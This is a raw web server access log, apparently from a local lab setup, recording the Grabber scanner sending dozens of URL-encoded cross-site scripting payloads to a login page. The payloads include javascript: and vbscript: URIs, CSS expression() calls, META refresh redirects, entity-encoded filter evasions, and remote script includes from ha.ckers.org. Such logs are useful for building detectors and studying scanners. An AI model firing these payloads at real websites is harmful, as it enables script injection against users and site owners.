172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /?username=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:26 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /?username=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:27 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:28 +0000] "GET /?username=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
